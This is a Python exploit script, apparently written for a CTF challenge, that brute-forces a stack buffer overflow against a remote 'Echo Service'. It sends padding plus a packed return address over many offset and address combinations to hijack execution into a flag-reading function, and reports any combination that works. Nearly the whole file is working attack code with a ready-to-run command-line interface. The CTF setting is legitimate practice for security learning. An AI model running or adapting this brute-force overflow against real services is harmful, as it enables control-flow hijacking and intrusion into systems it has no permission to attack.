#!/usr/bin/env python3
"""
Brute force script for Echo Service CTF challenge

This script tries different combinations of buffer offsets and potential
read_flag addresses to find the correct exploit parameters.
"""

import socket
import struct
import time
import sys

HOST = 'chals.uscc-cyberbowl-2025.ctf.institute'
PORT = 3014

def p32(addr):
    """Pack a 32-bit address in little-endian format"""
    return struct.pack('<I', addr)

def try_exploit(offset, addr, verbose=False):
    """
    Try a single exploit configuration
    
    Returns:
        (success, response) - success is True if we got something other than normal echo
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        
        # Receive banner
        banner = s.recv(1024)
        if verbose:
            print(f"Banner: {banner[:50]}")
        
        # Send exploit payload
        payload = b'A' * offset + p32(addr) + b'\n'
        s.sendall(payload)
        
        # Wait a bit for response
        time.sleep(0.3)
        
        # Receive response
        response = b''
        s.settimeout(1)
        try:
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        
        s.close()
        
        # Check if we got something interesting
        if b'uscc{' in response or b'flag{' in response or b'USCC{' in response:
            return (True, response)
        elif b'Missing flag' in response:
            # We might have hit read_flag but flag file doesn't exist locally
            # This is still progress!
            return (True, response)
        elif len(response) > 0 and response != banner and b'Invalid' not in response:
            # Got something different
            return (True, response)
        
        return (False, response)
        
    except Exception as e:
        if verbose:
            print(f"Error: {e}")
        return (False, None)

def bruteforce_offset(base_addr, min_offset=32, max_offset=72, step=4):
    """
    Brute force the buffer offset with a known address
    """
    print(f"[*] Brute forcing offset from {min_offset} to {max_offset} with address 0x{base_addr:08x}")
    
    for offset in range(min_offset, max_offset + 1, step):
        print(f"[*] Trying offset: {offset}", end='\r')
        success, response = try_exploit(offset, base_addr)
        
        if success:
            print(f"\n[+] FOUND! Offset: {offset}, Address: 0x{base_addr:08x}")
            print(f"[+] Response:\n{response.decode('latin-1', errors='replace')}")
            return offset
    
    print("\n[-] No success with this address")
    return None

def bruteforce_address(offset, min_addr=0x08048000, max_addr=0x08049000, step=16):
    """
    Brute force the function address with a known offset
    """
    print(f"[*] Brute forcing address from 0x{min_addr:08x} to 0x{max_addr:08x} with offset {offset}")
    
    addr = min_addr
    count = 0
    while addr <= max_addr:
        if count % 16 == 0:
            print(f"[*] Trying address: 0x{addr:08x}", end='\r')
        
        success, response = try_exploit(offset, addr)
        
        if success:
            print(f"\n[+] FOUND! Offset: {offset}, Address: 0x{addr:08x}")
            print(f"[+] Response:\n{response.decode('latin-1', errors='replace')}")
            return addr
        
        addr += step
        count += 1
        
        # Rate limiting - don't hammer the server
        if count % 10 == 0:
            time.sleep(0.5)
    
    print("\n[-] No success with this offset")
    return None

def smart_bruteforce():
    """
    Smart brute force - try common patterns first
    """
    print("[*] Starting smart brute force...")
    
    # Common offsets in CTF challenges
    common_offsets = [40, 44, 48, 52, 56, 60, 36, 32, 64, 68, 72]
    
    # Common address ranges for small binaries
    # read_flag is likely after main, usually in 0x080486xx - 0x080487xx range
    common_addr_ranges = [
        (0x08048600, 0x08048700, 16),  # Most likely
        (0x08048700, 0x08048800, 16),  # Also common
        (0x08048500, 0x08048600, 16),  # Less common
    ]
    
    print("[*] Trying common offset + address combinations...")
    
    for offset in common_offsets:
        for addr_min, addr_max, step in common_addr_ranges:
            print(f"\n[*] Testing offset {offset} with addresses 0x{addr_min:08x}-0x{addr_max:08x}")
            
            addr = addr_min
            while addr <= addr_max:
                success, response = try_exploit(offset, addr)
                
                if success:
                    print(f"\n[+] SUCCESS! Offset: {offset}, Address: 0x{addr:08x}")
                    print(f"[+] Response:\n{response.decode('latin-1', errors='replace')}")
                    print(f"\n[+] Run this to exploit:")
                    print(f"    python3 exploit.py {offset} 0x{addr:08x}")
                    return (offset, addr)
                
                addr += step
                
                # Rate limiting
                time.sleep(0.2)
    
    print("\n[-] No successful combination found")
    return (None, None)

def main():
    print("=" * 60)
    print("Echo Service - Brute Force Exploit Finder")
    print("=" * 60)
    
    if len(sys.argv) > 1:
        mode = sys.argv[1]
        
        if mode == 'offset' and len(sys.argv) == 3:
            # Brute force offset with known address
            addr = int(sys.argv[2], 16)
            bruteforce_offset(addr)
        
        elif mode == 'address' and len(sys.argv) == 3:
            # Brute force address with known offset
            offset = int(sys.argv[2])
            bruteforce_address(offset)
        
        elif mode == 'test':
            # Test a single configuration
            if len(sys.argv) == 4:
                offset = int(sys.argv[2])
                addr = int(sys.argv[3], 16)
                print(f"[*] Testing offset={offset}, addr=0x{addr:08x}")
                success, response = try_exploit(offset, addr, verbose=True)
                if success:
                    print(f"[+] Success!")
                    print(f"Response:\n{response.decode('latin-1', errors='replace')}")
                else:
                    print(f"[-] No success")
        else:
            print("Invalid arguments")
            print_usage()
    else:
        # Smart brute force
        smart_bruteforce()

def print_usage():
    print("\nUsage:")
    print("  python3 bruteforce.py                          - Smart brute force")
    print("  python3 bruteforce.py offset <addr>            - Brute force offset")
    print("  python3 bruteforce.py address <offset>         - Brute force address")
    print("  python3 bruteforce.py test <offset> <addr>     - Test single config")
    print("\nExamples:")
    print("  python3 bruteforce.py")
    print("  python3 bruteforce.py offset 0x080486a7")
    print("  python3 bruteforce.py address 40")
    print("  python3 bruteforce.py test 40 0x080486a7")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
